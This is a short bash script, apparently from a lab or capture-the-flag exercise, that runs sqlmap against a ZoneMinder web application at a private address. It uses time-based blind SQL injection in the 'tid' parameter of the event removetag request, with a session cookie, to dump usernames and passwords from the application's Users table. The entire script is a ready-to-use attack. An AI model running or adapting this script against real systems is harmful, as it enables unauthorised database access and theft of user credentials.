#!/bin/bash

TARGET="http://10.129.61.151/zm/index.php?view=request&request=event&action=removetag&tid=1"
COOKIE="ZMSESSID=SESSION_COOKIE_HERE"

sqlmap -u "$TARGET" --cookie="$COOKIE" -p tid \
  --dbms=mysql --batch \
  --technique=T --threads=10 \
  -D zm -T Users -C "Username,Password" --dump
